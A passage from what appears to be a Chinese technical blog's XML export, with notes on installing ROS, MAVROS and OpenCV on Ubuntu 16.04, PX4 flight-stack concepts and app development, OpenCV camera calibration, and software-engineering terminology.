    <content type="text"><![CDATA[MAVROS包支持运行ROS的计算机、支持Mavlink的自驾仪、支持Mavlink的地面控制站之间使用Mavlink协议进行通信，如图1所示。 图1 px4软件在环仿真 为构建px4软件在环仿真环境，下面介绍在协同计算机上安装Ubuntu16.04、ROS和MAVROS的步骤。 安装ubuntu 16.04安装ubuntu 16.04 LTS桌面板的教程请参考链接Ubuntu 16.04 安装基础入门教程（图文）。 安装ROSROS简介ROS（机器人操作系统，Robot Operating System），是专为机器人软件开发所设计出来的一套电脑操作系统架构。它是一个开源的元级操作系统（后操作系统），提供类似于操作系统的服务，包括硬件抽象描述、底层驱动程序管理、共用功能的执行、程序间消息传递、程序发行包管理，它也提供一些工具和库用于获取、建立、编写和执行多机融合的程序。 ROS的首要设计目标是在机器人研发领域提高代码复用率。ROS是一种分布式处理框架（又名Nodes）。这使可执行文件能被单独设计，并且在运行时松散耦合。这些过程可以封装到数据包（Packages）和堆栈（Stacks）中，以便于共享和分发。ROS还支持代码库的联合系统。使得协作亦能被分发。这种从文件系统级别到社区一级的设计让独立地决定发展和实施工作成为可能。上述所有功能都能由ROS的基础工具实现。 ROS有三个层次的概念：分别为Filesystem level，Computation graph level， 以及Communication level。 以下内容具体的总结了这些层次及概念。除了这三个层次的概念， ROS也定义了两种名称— Package资源名称和Graph资源名称。 安装ROS不建议在虚拟机中安装Ubuntu，再安装ROS。具体ROS安装步骤请参考ROS 不能再详细的安装教程和Ubuntu install of ROS Kinetic。在此只简单记录Ubuntu 16.04 中安装ROS步骤： 设置source.list 1sudo sh -c &apos;echo &quot;deb http://packages.ros.org/ros/ubuntu $(lsb_release -sc) main&quot; &gt; /etc/apt/sources.list.d/ros-latest.list&apos; 设置公钥 如何在连接服务器的过程中出现问题，可设置可选的hkp://pgp.mit.edu:80 或 hkp://keyserver.ubuntu.com:80 1sudo apt-key adv --keyserver hkp://ha.pool.sks-keyservers.net:80 --recv-key 421C365BD9FF1F717815A3895523BAEEB01FA116 安装 12sudo apt-get updatesudo apt-get install ros-kinetic-desktop-full 初始化rosdep 12sudo rosdep initrosdep update 环境配置 12echo &quot;source /opt/ros/kinetic/setup.bash&quot; &gt;&gt; ~/.bashrcsource ~/.bashrc 安装ros组件构建环境 1sudo apt install python-catkin-tools python-rosinstall python-rosinstall-generator python-wstool build-essential -y 运行ROS在Ubuntu 16.04终端中运行如下命令：1234567891011121314151617181920212223242526272829303132333435363738394041# roscore will start up a ROS Master, a ROS Parameter Server and a rosout logging node$ roscore# rosnode is a command-line tool for printing information about ROS Nodes.$ rosnode list# rospack allows you to get information about packages. $ rospack list# rosrun will locate PACKAGE and try to find an executable named EXECUTABLE in the PACKAGE tree. If it finds it, it will run it with ARGS.# Usage: rosrun [--prefix cmd] [--debug] PACKAGE EXECUTABLE [ARGS]$ rosrun turtlesim turtlesim_node$ rosrun turtlesim turtle_teleop_key# record the message which published in the topic$ rosbag record /turtle1/cmd_vel# check what&apos;s happen in ros system$ rosrun rqt_graph rqt_graph# rqt_plot displays a scrolling time plot of the data published on topics$ rosrun rqt_plot rqt_plot# rostopic is a command-line tool for printing information about ROS Topics.$ rostopic list# rostopic echo shows the data published on a topic.$ rostopic echo /turtle1/cmd_vel# rostopic type returns the message type of any topic being published.$ rostopic type /turtle1/cmd_vel# rostopic pub publishes data on to a topic currently advertised.$ rostopic pub -1 /turtle1/cmd_vel geometry_msgs/Twist -- &apos;[2.0, 0.0, 0.0]&apos; &apos;[0.0, 0.0, 1.8]&apos;# rostopic hz reports the rate at which data is published.$ rostopic hz /turtle1/pose# check info of /turtlesim node$ rosnode info /turtlesim 安装MAVROS具体安装MAVROS的步骤请参考链接MAVROS。下面简单介绍Ubuntu 16.04下从源代码安装MAVROS的过程。 创建catkin工作空间 1234mkdir -p ~/catkin_ws/srccd ~/catkin_wscatkin initwstool init src 安装MAVLink 1rosinstall_generator --rosdistro kinetic mavlink | tee /tmp/mavros.rosinstall 安装MAVROS 1rosinstall_generator --upstream mavros | tee -a /tmp/mavros.rosinstall 创建工作空间和依赖 123wstool merge -t src /tmp/mavros.rosinstallwstool update -t src -j4rosdep install --from-paths src --ignore-src -y 安装GeographicLib数据集 1sudo ./src/mavros/mavros/scripts/install_geographiclib_datasets.sh 构建源 1catkin build 添加工作空间到ros环境 1234# Needed or rosrun can&apos;t find nodes from this workspace.$ source devel/setup.bash# Or write in .bashrc$ echo &quot;source ~/catkin_ws/devel/setup.bash&quot; &gt;&gt; ~/.bashrc 参考链接 Ubuntu 16.04 安装基础入门教程（图文）, by ubuntu中文论坛. 机器人操作系统,by wikipedia. ROS 不能再详细的安装教程,by 小萌是个球. Ubuntu install of ROS Kinetic, by ROS.org. ROS Tutorials, by ROS.org. MAVROS, by DroneCode. catkin 与 rosbuild解析及两者区别和联系,by Xuefeng_BUPT. Installing and Configuring Your ROS Environment, by ros.org. Installing and Configuring Your ROS Environment,by ros.org.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
        <tag>PX4</tag>
        <tag>ROS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机科学术语辨析]]></title>
    <url>%2F2019%2F05%2F05%2F%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E6%9C%AF%E8%AF%AD%E8%BE%A8%E6%9E%90%2F</url>
    <content type="text"><![CDATA[计算机科学中的一些术语是同行之间进行交流的工具，但是这些术语约定俗成，缺乏权威定义，在不同的语境下有不同的涵义，不同的人有不同的理解，由此造成很多分歧。本文记录常用计算机科学术语，通过规范和校正其内涵和外延，避免分歧，提高效率。 常用术语架构软件架构是有关软件整体结构与组件的抽象描述，用于指导大型软件系统各个方面的设计。 软件架构是一个系统的草图，抽象层次高。软件架构描述的对象是直接构成系统的抽象组件。各个组件之间的连接则明确和相对细致地描述组件之间的通讯。在实现阶段，这些抽象组件被细化为实际的组件，比如具体某个类或者对象。在面向对象领域中，组件之间的连接通常用接口来实现。 模式在软件工程中，设计模式（design pattern）是对软件设计中普遍存在（反复出现）的各种问题，所提出的解决方案。这个术语是由埃里希·伽玛（Erich Gamma）等人在1990年代从建筑设计领域引入到计算机科学的。 设计模式并不直接用来完成代码的编写，而是描述在各种不同情况下，要怎么解决问题的一种方案。面向对象设计模式通常以类别或对象来描述其中的关系和相互作用，但不涉及用来完成应用程序的特定类别或对象。设计模式能使不稳定依赖于相对稳定、具体依赖于相对抽象，避免会引起麻烦的紧耦合，以增强软件设计面对并适应变化的能力。 《设计模式》一书原先把设计模式分为创建型模式、结构型模式、行为型模式，把它们通过授权、聚合、诊断的概念来描述。 模块模块，module，模块是一个通用概念，可能从功能或其他目的来区分。模块可以是子系统子领域，主要取决于上下文环境的用法。 通常我们会说程序模块，功能模块，这实际上是在按照不同的标准对模块的内容和范围的不同定义。 通常我们说的程序模块，是指的一段能够实现某个有价值目标的的成员代码段，这样的东西，我们还有另一个称呼：例程，而例程有两种，即函数和过程，它们都能实现一个有价值的目标供其它的模块使用。 而功能模块的说法一般在分析和设计阶段出现得比较频繁，通常我们用一个功能模块来说明一个功能所包含的系统行为，当我们觉得分析的颗粒度可能更大一些的时候我们可以用一个功能模块来表示一组功能的集合，这似乎让我们觉得，模块这个词的概念和“子系统”这个词的概念有些模糊，是的，事实上，有些大的模块会慢慢的让我们觉得称呼他们子系统更合适，或者一个子系统，我们会慢慢发现你还包含着一些模块。 但是无论怎样，定义模块的原则应该是：高内聚和低耦合。 组件软件组件，定义为自包含的、可编程的、可重用的、与语言无关的软件单元。 插件根据对组件和模块的分析，插件属于组件，而且还是一个程序模块，也是一个功能模块。插件是一种电脑程序，通过和应用程序的互动，来替应用程式增加一些特定的功能。 插件必须依赖于应用程序才能发挥自身功能，仅靠插件是无法正常运行的。 使用方法：满足一定接口规范的具有一定功能的程序模块。开发者可以在自己软件系统中设计相应的接口以匹配某个插件，也可以设计一定的接口规范，来让别人开发插件。插件和程序之间通过接口进行交互。 控件可视化的组件。 中间件中间件是提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。 术语辨析面向对象编程 VS 面向过程编程 VS 面向切面编程面向过程(Procedure Oriented)是一种以过程为中心的编程思想。这些都是以什么正在发生为主要目标进行编程，不同于面向对象的是谁在受影响。与面向对象明显的不同就是封装、继承、类。 面向对象编程（Object Oriented Programming，OOP，面向对象程序设计）是一种计算机编程架构。OOP 的一条基本原则是计算机程序是由单个能够起到子程序作用的单元或对象组合而成。OOP 达到了软件工程的三个主要目标：重用性、灵活性和扩展性。为了实现整体运算，每个对象都能够接收信息、处理数据和向其它对象发送信息。 面向切面编程（Aspect Oriented Programming(AOP)），是一个比较热门的话题。AOP主要实现的目的是针对业务处理过程中的切面进行提取，它所面对的是处理过程中的某个步骤或阶段，以获得逻辑过程中各部分之间低耦合性的隔离效果。 面向过程编程围绕行为组织事物，面向对象编程围绕事物组织行为，有没有类、有没有继承并不是两种编程方法差异的关键； 面向切面编程是横跨流程的，实现某个特定位置的功能，面向功能进行抽象。具体流程只需做引用即可，而不至于不同流程中冗余很多类似代码。 组件化开发 VS 模块化开发组件化和模块化的中心思想都是分而治之。目的都是将一个庞大的系统拆分成多个组件或者说是模块。 模块化就是将一个程序按照其功能做拆分，分成相互独立的模块，以便于每个模块只包含与其功能相关的内容。模块我们相对熟悉,比如登录功能可以是一个模块,搜索功能可以是一个模块,汽车的发送机也可是一个模块. 组件化就是基于可重用的目的，将一个大的软件系统按照分离关注点的形式，拆分成多个独立的组件，主要目的就是减少耦合. 一个独立的组件可以是一个软件包、web服务、web资源或者是封装了一些函数的模块。比如汽车的发动机是一个模块,也是一个组件,再或者前端中的一个日历控件是一个模块,也一个组件.这样，独立出来的组件可以单独维护和升级而不会影响到其他的组件. 组件和模块是一对容易混淆的名词,也常常被用来相互替换,两者是否有差异往往取决于专业背景、所在领域、以及视角。从设计上来看,组件强调复用,模块强调职责(内聚、分离),或者说组件是达到可复用要求的模块 模块化强调的是拆分，无论是从业务角度还是从架构、技术角度，模块化首先意味着将代码、数据等内容按照其职责不同分离，使其变得更加容易维护、迭代，使开发人员可以分而治之。 组件化则着重于可重用性，不管是界面上反复使用的用户头像按钮，还是处理数据的流程中的某个部件，只要可以被反复使用，并且进行了高度封装，只能通过接口访问，就可以称其为“组件”。 参考链接 面向对象 vs 类与继承 vs 面向组件, by 龙腾道默默地. 软件架构,by wikipedia. 软件架构入门,by 阮一峰. 设计模式),by wikipedia. 软件架构、框架、模式、模块、组件、插件概念汇总,by 时间的朋友. 模块化与组件化,by 滴答. 面向过程编程，面向对象编程和面向切面编程理解, by 枫叶千言.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PX4应用开发简要教程]]></title>
    <url>%2F2019%2F04%2F29%2FPX4%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%E7%AE%80%E8%A6%81%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[本文说明如何创建和运行第一个板载应用程序。 它涵盖了PX4上应用程序开发所需的所有基本概念和API。 开发环境在开发第一个PX4应用程序之前，需要构建如下开发环境： PX4 SITL模拟器或兼容PX4的飞行控制器。 PX4开发工具链用于所需目标。 从Github下载PX4源代码 简单应用代码编写本节创建一个最小的应用，仅用于打印Hello Sky！。整个应用由一个简单C文件和一个cmake定义文件构成。具体步骤如下： 创建目录Firmware/src/examples/px4_simple_app 在上述目录中创建C文件px4_simple_app.c 在上述目录中创建cmake定义文件CMakeLists.txt px4_simple_app.c代码内容如下： 12345678910111213141516/** * @file px4_simple_app.c * Minimal application example for PX4 autopilot * * @author Example User &lt;mail@example.com&gt; */#include &lt;px4_log.h&gt;__EXPORT int px4_simple_app_main(int argc, char *argv[]);int px4_simple_app_main(int argc, char *argv[])&#123; PX4_INFO(&quot;Hello Sky!&quot;); return OK;&#125; CMakeLists.txt文件内容如下： 123456789px4_add_module( MODULE examples__px4_simple_app MAIN px4_simple_app STACK_MAIN 2000 SRCS px4_simple_app.c DEPENDS platforms__common ) px4_add_module()方法从模块描述构建静态库。 MAIN块列出了模块的名称 。这会将该模块与NuttX一起注册，以便可以从PX4 shell或SITL控制台调用它。 编译链接针对不同的目标平台，使用不同的make命令构建： jMAVSim Simulator: make posix_sitl_default jmavsim Pixhawk v1/2: make px4fmu-v2_default Pixhawk v3: make px4fmu-v4_default 测试应用（硬件）上传固件到开发板在开发板上测试，使用如下命令上传PX4固件： Pixhawk v1/2: make px4fmu-v2_default upload Pixhawk v3: make px4fmu-v4_default upload 连接控制台现在通过串口或USB连接到系统控制台。 点击ENTER将弹出shell提示符： 1234nsh&gt;nsh&gt;helpnsh&gt; px4_simple_appHello Sky! 测试应用（SITL）如果您正在使用SITL，PX4控制台将自动启动。 与nsh控制台一样，您可以键入help以查看内置应用程序列表。 输入px4_simple_app以运行最小应用程序。 12pxh&gt; px4_simple_appINFO [px4_simple_app] Hello Sky! 参考链接 PX4编译开发环境配置,by jackhuang. PX4开发基本概念解读,by jackhuang. First Application Tutorial (Hello Sky),by dronecode.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OpenCV4.0相机标定教程]]></title>
    <url>%2F2019%2F04%2F28%2FOpenCV4-0%E7%9B%B8%E6%9C%BA%E6%A0%87%E5%AE%9A%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[相机已经存在了很长时间。 然而，随着20世纪后期廉价针孔相机的推出，它们成为我们日常生活中的常见现象。 不幸的是，这种便宜与其价格有关：严重失真。 幸运的是，这些是常数，并且通过校准和一些重新映射，我们可以纠正这一点。 此外，通过校准，您还可以确定相机的自然单位（像素）与真实世界单位（例如毫米）之间的关系。这个校准过程就是相机标定。 理论对于失真，OpenCV考虑了径向和切向因子。 对于径向因子，使用以下公式： x_{distorted} = x( 1 + k_1 r^2 + k_2 r^4 + k_3 r^6) \\ y_{distorted} = y( 1 + k_1 r^2 + k_2 r^4 + k_3 r^6)因此，对于$（x，y）$坐标处的未失真像素点，其在失真图像上的位置将是$（x{distorted},y{distorted}）$。 径向变形的存在表现为“桶状”或“鱼眼”效应。 由于摄像镜头与成像平面不完全平行，因此会发生偏心畸变。 它可以通过公式表示： x_{distorted} = x + [ 2p_1xy + p_2(r^2+2x^2)] \\ y_{distorted} = y + [ p_1(r^2+ 2y^2)+ 2p_2xy]所以我们有五个失真参数，在OpenCV中呈现为一行矩阵，有5列： distortion\_coefficients=(k_1 \hspace{10pt} k_2 \hspace{10pt} p_1 \hspace{10pt} p_2 \hspace{10pt} k_3)现在我们使用以下公式进行单位转换： \left [ \begin{matrix} x \\ y \\ w \end{matrix} \right ] = \left [ \begin{matrix} f_x & 0 & c_x \\ 0 & f_y & c_y \\ 0 & 0 & 1 \end{matrix} \right ] \left [ \begin{matrix} X \\ Y \\ Z \end{matrix} \right ]这里通过使用单应性坐标系（和$w = Z$）来解释$w$的存在。 未知参数是$f_x$和$f_y$（相机焦距）和（$c_x，c_y$），它们是以像素坐标表示的光学中心。 如果对于两个轴，使用具有给定纵横比（通常为1）的共同焦距，则$f_y = f_x a$，并且在上部公式中，我们将具有单个焦距$f$。 包含这四个参数的矩阵称为*相机矩阵。 虽然无论使用何种相机分辨率，失真系数都是相同的，但应根据校准分辨率的当前分辨率进行缩放。 确定这两个矩阵的过程是校准。 通过基本几何方程计算这些参数。 使用的等式取决于所选择的校准对象。 目前，OpenCV支持三种类型的校准对象： 古典黑白棋枰 对称的圆圈图案 不对称的圆圈图案 基本上，您需要使用相机拍摄这些图案的快照，然后让OpenCV找到它们。 每个找到的模式都会产生一个新的等式。 要求解方程，您需要至少预定数量的模式快照，以形成一个良好的方程系统。 棋盘图案的数量较高，圆圈图案的数量较少。 例如，理论上棋盘图案需要至少两个快照。 但是，实际上我们的输入图像中存在大量噪声，因此为了获得良好的结果，您可能需要至少10个不同位置的输入模式的快照。 目标OpenCV4.0中相机标定样例程序的目标： 确定失真矩阵 确定相机矩阵 从摄像机，视频和图像文件列表中获取输入 从XML / YAML文件中读取配置 将结果保存到XML / YAML文件中 计算重新投影误差 源代码您也可以在OpenCV源库的samples / cpp / tutorial_code / calib3d / camera_calibration /文件夹中找到源代码，或从此处下载。要使用该程序，请使用-h参数运行它。该程序有一个重要的参数：配置文件的名称。如果没有给出，那么它将尝试打开名为“default.xml”的那个。这是XML格式的示例配置文件。在配置文件中，您可以选择将相机用作输入，视频文件或图像列表。如果选择最后一个，则需要创建一个配置文件，用于枚举要使用的图像。这是一个例子。要记住的重要部分是需要使用绝对路径或应用程序工作目录中的相对路径来指定图像。您可以在上面提到的samples目录中找到所有这些。 应用程序启动时从配置文件中读取设置。虽然这是它的一个重要部分，但它与本教程的主题无关：摄像机校准。因此，我选择不在此处发布该部分的代码。有关如何执行此操作的技术背景，您可以在使用XML和YAML文件的文件输入和输出教程中找到。 构建相机标定程序切换到camera_calibration示例教程源代码所在目录，创建build临时目录并创建CMakeLists.txt文件。 123cd ~/opencv/samples/cpp/tutorial_code/calib3d/camera_calibration/mkdir buildtouch CMakeLists.txt CMakeLists.txt文件内容如下：1234567cmake_minimum_required(VERSION 2.8)set (CMAKE_CXX_STANDARD 11)project( camera_calibration )find_package( OpenCV REQUIRED )include_directories( $&#123;OpenCV_INCLUDE_DIRS&#125; )add_executable( camera_calibration camera_calibration.cpp )target_link_libraries( camera_calibration $&#123;OpenCV_LIBS&#125; ) 构建相机标定程序：123cd buildcmake ..make 运行相机标定程序运行相机标定程序的目的在于获得相机的失真参数和内外参，其中相机的失真参数和内参只需标定一次便不再变化。下面以标定笔记本自带摄像头说明运行相机标定程序的步骤。 修改标定配置参数找到camera_calibration/in_VID5.xml文件，这是标定程序使用的配置文件，需要设置里面的几个参数。 修改棋盘格交叉点参数 123&lt;!-- Number of inner corners per a item row and column. (square, circle) --&gt;&lt;BoardSize_Width&gt;9&lt;/BoardSize_Width&gt;&lt;BoardSize_Height&gt;6&lt;/BoardSize_Height&gt; 需要特别注意的是，这里的宽度和高度是指内部交叉点的个数，而不是方形格的个数。如图1所示的棋盘格，内部交叉点的宽度是9，高度是6。请务必填写正确，否则无法标定。 图1 用于相机标定的棋盘格 修改每格的宽度 每格的宽度应设置为实际的毫米数，该参数的实际用途尚待考证。目前看来，即使设置的不准确也无大碍。根据我使用的棋盘格，设置棋盘格参数42。 12&lt;!-- The size of a square in some user defined metric system (pixel, millimeter)--&gt;&lt;Square_Size&gt;42&lt;/Square_Size&gt; 设置图像输入方式 例程提供了三种输入方式。不过，如果待标定的摄像头已经接入电脑，建议使用input camera方式。该方式只需要设置视频输入设备号，对于笔记本电脑来说，通常0表示笔记本自带摄像头，1表示外接摄像头。 123456 &lt;!-- The input to use for calibration. To use an input camera -&gt; give the ID of the camera, like &quot;1&quot; To use an input video -&gt; give the path of the input video, like &quot;/tmp/x.avi&quot; To use an image list -&gt; give the path to the XML or YAML file containing the list of the images, like &quot;/tmp/circles_list.xml&quot; --&gt;&lt;Input&gt;&quot;0&quot;&lt;/Input&gt; 执行相机标定程序运行如下命令开始标定笔记本自带摄像头，标定完成后将得到保存相关参数的文件。 1./camera_calibration ../in_VID5.xml 参考链接 Using OpenCV with gcc and CMake,by opencv. Camera calibration With OpenCV,by opencv. C++11 activation with or ,by stackoverflow. 计算机视觉之相机成像原理与坐标系转换,by jack huang. OpenCV 相机参数标定（Camera Calibration）,by Wafei. 图像二维坐标转世界三维坐标, by 橙子. solvepnp三维位姿估算,by cocoaqin. 单目SLAM理论基础,by zhaoxuhui. SLAM相机位姿估计(1),by zhaoxuhui. 张氏法相机标定,by Lstyle. 机器视觉的相机标定到底是什么？, by zhihu. 相机标定究竟在标定什么？,by 许翔翔.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机视觉</tag>
        <tag>opencv</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu_16.04安装OpenCV的方法]]></title>
    <url>%2F2019%2F04%2F28%2FUbuntu-16-04%E5%AE%89%E8%A3%85opencv%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[本文记录在Ubuntu16.04 LTS操作系统中从源代码编译安装OpenCV的过程。 安装必需的软件包123[compiler] sudo apt-get install build-essential[required] sudo apt-get install cmake git libgtk2.0-dev pkg-config libavcodec-dev libavformat-dev libswscale-dev[optional] sudo apt-get install python-dev python-numpy libtbb2 libtbb-dev libjpeg-dev libpng-dev libtiff-dev libjasper-dev libdc1394-22-dev 下载OpenCV源代码123cd ~/&lt;my_working_directory&gt;git clone https://github.com/opencv/opencv.gitgit clone https://github.com/opencv/opencv_contrib.git 使用CMake构建OpenCV创建临时的build目录1234567cd ~/opencv# 查看并检出OpenCV最新发布版git taggit checkout 4.1.0mkdir buildcd build 创建配置文件12345$ cmake -D CMAKE_BUILD_TYPE=Release -D CMAKE_INSTALL_PREFIX=/usr/local ..# 可选，如使用opencv_contrib, 采用如下命令生成编译配置文件$ cmake -D CMAKE_BUILD_TYPE=Release -D CMAKE_INSTALL_PREFIX=/usr/local -D OPENCV_EXTRA_MODULES_PATH=../../opencv_contrib/modules ..# 可选，构建示例程序和文档cmake -D CMAKE_BUILD_TYPE=Release -D CMAKE_INSTALL_PREFIX=/usr/local -D BUILD_EXAMPLES=1 -D BUILD_DOCS=1 .. 构建OpenCV1make -j3 # runs 3 jobs in parallel 安装OpenCV1sudo make install 参考链接 Installation in Linux, by opencv. 4.0.0 does not produce pkgconfig file, by opencv. Pkg-config,by wikipedia.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机视觉</tag>
        <tag>opencv</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PX4开发基本概念解读]]></title>
    <url>%2F2019%2F04%2F27%2FPX4%E5%BC%80%E5%8F%91%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E8%A7%A3%E8%AF%BB%2F</url>
    <content type="text"><![CDATA[进行PX4开发，必先了解PX4体系结构及相关概念。下面及简要介绍PX4开发的相关知识。 PX4体系结构PX4由两个层次组成：一是飞行控制栈(flight stack)，即自驾仪的软件解决方案，二是中间件，一种可以支持任意类型自主机器人的通用机器人中间件。 所有的无人机机型，事实上所有的包括船舶在内的机器人系统，都具有同一代码库。整个系统设计是反应式(reactive)的，这意味着： 所有的功能被划分为可替换部件 通过异步消息传递进行通信 该系统可以应对不同的工作负载 除了这些运行时考虑之外，其模块化最大限度地提高了系统的可重用性。 图1 PX4体系结构 飞行控制栈飞行控制栈是自主无人机的引导、导航和控制算法的集合。它包括用于固定翼，多旋翼和垂直起降机身的控制器以及用于姿态和位置的估计器。 图2显示了飞行控制栈的构建块的预览。 它包含从传感器，RC输入和自主飞行控制（导航器）到电机或伺服控制（执行器）的完整管道。 图2 PX4飞行控制栈结构图 估计器采用一个或多个传感器输入，组合它们，并计算无人机状态（例如来自IMU传感器数据的姿态）。 控制器是将设定值和测量或估计状态（过程变量）作为输入的组件。 其目标是调整过程变量的值，使其与设定值匹配。 输出是最终达到该设定点的校正。 例如，位置控制器将位置设定点作为输入，过程变量是当前估计的位置，输出是将车辆移向期望位置的姿态和推力设定点。 混合器接受强制命令（例如向右转）并将它们转换为单独的电机命令，同时确保不超过某些限制。 该平移特定于无人机类型并且取决于各种因素，例如关于重心的马达布置或无人机的转动惯量。 中间件中间件主要包括嵌入式传感器的设备驱动程序，与外部世界的通信（协同计算机，地面控制站等）和uORB发布 - 订阅消息总线。 此外，中间件包括一个模拟层，允许PX4飞行代码在桌面操作系统上运行，并在模拟的“世界”中控制计算机建模的无人机。 更新速率由于模块等待消息更新，因此驱动程序通常会定义模块更新的速度。 大多数IMU驱动器以1kHz采样数据，将其集成并以250Hz发布。 系统的其他部分，例如导航器，不需要如此高的更新速率，因此运行速度相当慢。 可以通过运行uorb top在系统上实时检查消息更新率。 运行时环境PX4可在各种提供POSIX-API的操作系统上运行（例如Linux，macOS，NuttX或QuRT）。 它还应该具有某种形式的实时调度（例如FIFO）。 模块间通信（使用uORB）基于共享内存。 整个PX4中间件在单个地址空间中运行，即在所有模块之间共享存储器。 有两种不同的方式可以执行模块： 任务：模块在自己的任务中运行，具有自己的堆栈和进程优先级（这是更常见的方式）。 工作队列：模块在共享任务上运行，这意味着它不拥有堆栈。 多个任务在同一堆栈上运行，每个工作队列具有一个优先级。 通过指定将来的固定时间来安排任务。 优点是它使用较少的RAM，但不允许任务在消息上休眠或轮询。 工作队列用于周期性任务，例如传感器驱动器或陆地探测器。 操作系统相关信息NuttXNuttX是在飞行控制板上运行PX4的主要RTOS。 它是开源（BSD许可证），重量轻，高效且非常稳定。 模块作为任务执行：它们有自己的文件描述符列表，但它们共享一个地址空间。 任务仍然可以启动共享文件描述符列表的一个或多个线程。 每个任务/线程都有一个固定大小的堆栈，并且有一个周期性任务，它检查所有堆栈是否有足够的可用空间（基于堆栈着色）。 Linux / MacOS在Linux或macOS上，PX4在单个进程中运行，并且模块在它们自己的线程中运行（NuttX上的任务和线程之间没有区别）。 PX4飞行模式飞行模式定义了系统在任何给定时间的状态。用户可以使用远程遥控器或者QGroundControl地面站来进行飞行模式切换。 图3 PX4飞行模式控制流程图 Dronecode平台软硬件架构Dronecode是开源的无人机平台，其软硬件体系结构如图4所示。图4左侧显示了一种可能的硬件配置，其中飞行控制器（浅蓝色）通过RTPS连接到感知计算机（深蓝色）。 感知计算机使用相机传感器阵列提供视觉控制和物体避免，并且具有单独的有效载荷相机。 图的右侧显示了端到端软件堆栈。 堆栈“近似”水平对齐图表的硬件部分，并进行颜色编码，以显示飞行控制器上运行的软件以及配套计算机上的软件。 图4 Dronecode平台软硬件架构 PX4位姿控制多旋翼位置控制 图5 PX4多旋翼位置控制 混合和执行器PX4架构保证了核心控制器中不需要针对机身布局做特别处理。 混控指的是把输入指令（例如：遥控器打右转）分配到电机以及舵机的执行器（如电调或舵机PWM）指令。对于固定翼的副翼控制而言，每个副翼由一个舵机控制，那么混控的意义就是控制其中一个副翼抬起而另一个副翼落下。同样的，对多旋翼而言，俯仰操作需要改变所有电机的转速。 将混控逻辑从实际姿态控制器中分离出来可以大大提高复用性。 控制管线一个特定的控制器（如姿态控制器）发送特定的归一化（-1..+1）的命令到给混合（mixing）,然后混合后输出独立的PWM到执行器（电调，舵机等）.在经过输出驱动如（串口，UAVCAN，PWM）等将归一化的值再转回特性的值（如输出1300的PWM等）。 图6 PX4控制管线 控制组PX4 有输入组和输出组的概念，顾名思义：控制输入组（如： attitude），就是用于核心的飞行姿态控制，（如： gimbal ）就是用于挂载控制. 一个输出组就是一个物理总线，如前8个PWM组成的总线用于舵机控制，组内带8个归一化（-1..+1）值,一个混合就是用于输入和输出连接方式（如:对于四轴来说,输入组有俯仰，翻滚，偏航等，对于于向前打俯仰操作，就需要改变输出组中的4个电调的PWM输出值，前俩个降低转速，后两个增加转速，飞机就向前）。 对于简单的固定翼来说，输入0（roll），就直接连接到输出的0（副翼）。对于多旋翼来说就不同了，输入0（roll）需要连接到所有的4个电机。 参考链接 PX4 Development Guide (STABLE - v1.8.2),by Dronecode. PX4开发指南, by Dronecode.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>无人机</tag>
        <tag>飞行仿真</tag>
        <tag>PX4</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PX4编译开发环境配置]]></title>
    <url>%2F2019%2F04%2F26%2FPX4%E7%BC%96%E8%AF%91%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[拟在基于NuttX的硬件平台如Pixhawk系列开源硬件平台上运行自定义的Px4自驾仪软件，因此需要建立Px4的编译开发环境。以官方文档推荐，在Ubuntu 16.04 LTS操作系统上建立Px4编译开发环境为例，记录整个配置过程。 安装Ubuntu 16.04 LTS官方推荐在Mac OS和Linux上进行开发，因此选择安装Ubuntu 16.04 LTS作为Px4开发的操作系统。主要步骤如下： 安装VirtualBox系统虚拟机 在VirtualBox创建虚拟机 在虚拟机中安装Ubuntu 16.04 LTS操作系统 Ubuntu中安装工具链权限设置为了使当前用户能够访问串口，将当前用户添加到dialout组。 12sudo usermod -a -G dialout $USERreboot 安装工具链Pixhawk/NuttX (and jMAVSim)针对基于NuttX的硬件平台如Pixhawk构建开发工具链，步骤如下： 下载ubuntu_sim_nuttx.sh 运行脚本ubuntu_sim_nuttx.sh 完成后重启 123wget https://raw.githubusercontent.com/PX4/Devguide/master/build_scripts/ubuntu_sim_nuttx.shsource ubuntu_sim_nuttx.shreboot 编译Px4软件下载Px4源代码12345678910111213mkdir -p ~/srccd ~/srcgit clone https://github.com/PX4/Firmware.gitcd Firmware# list the releases (tags)git tag -l# Checkout code for particular tag (e.g. for tag v1.8.2 stable version)git checkout v1.8.2git submodule update --init --recursive 现在可以通过编译源代码来构建二进制文件。在直接使用硬件前，推荐先进行仿真。 jMAVSim仿真器在直接使用硬件之前，以jMAVSim仿真器为目标平台构建PX4，验证PX4的正确性。注意在virtualbox中启动3D图形加速，防止jMAVSim运行出错！ 1234make posix jmavsim# 起飞四旋翼无人机pxh&gt; commander takeoff 基于NuttX / Pixhawk的硬件板以Pixhawk为目标平台，构建PX4。 12cd Firmwaremake px4fmu-v2_default 注意到“make”是一个字符命令编译工具，“px4fmu-v2”是硬件/ardupilot版本，“default”是默认配置，所有的PX4编译目标遵循这个规则。 成功编译的最后输出是这样的： 12345[100%] Linking CXX executable firmware_nuttx[100%] Built target firmware_nuttxScanning dependencies of target build/firmware_px4fmu-v2[100%] Generating nuttx-px4fmu-v2-default.px4[100%] Built target build/firmware_px4fmu-v2 